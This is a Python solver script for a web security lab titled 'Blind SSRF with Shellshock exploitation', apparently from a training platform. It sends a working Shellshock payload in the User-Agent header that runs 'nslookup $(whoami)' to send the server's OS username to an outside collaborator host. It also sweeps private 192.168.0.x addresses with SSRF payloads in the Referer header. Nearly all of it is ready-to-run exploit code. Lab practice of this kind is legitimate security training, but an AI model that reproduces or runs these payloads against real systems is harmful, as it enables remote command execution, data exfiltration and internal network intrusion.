import requests
import urllib3
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Blind SSRF with Shellshock exploitation"


def run(url, payload, proxies=None):
    url = url.rstrip('/')

    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Inject shellshock payload into the User-Agent header to exfiltrate the OS user via DNS lookup\n2. Inject SSRF payload into the Referer header to iterate over all private IPs\n3. Check your burp collaborator for the OS user in the DNS lookup\n4. Submit the solution\n""")

    print(Fore.WHITE + "Injection point: " +
          Fore.YELLOW + "User-Agent & Referer headers")

    burp_input = input("[?] Enter the Burp Collaborator URL: ").strip()
    shellshock_payload = f"() {{ :;}}; /bin/nslookup $(whoami).{burp_input}"

    for x in range(0, 255):
        ssrf_payload = f"http://192.168.0.{x}:8080/admin"
        print(Fore.WHITE + f"Injecting SSRF with Shellshock to: " +
              Fore.YELLOW + ssrf_payload)

        headers = {
            "User-Agent": shellshock_payload,
            "Referer": ssrf_payload
        }

        try:
            r = requests.get(
                f"{url}/product?productId=1",
                headers=headers,
                verify=False,
                proxies=proxies,
            )
        except requests.exceptions.RequestException:
            continue

    print(Fore.GREEN +
          "[+] Done sending payloads. Check Burp Collaborator for DNS interaction and submit the hostname manually.")
    return True
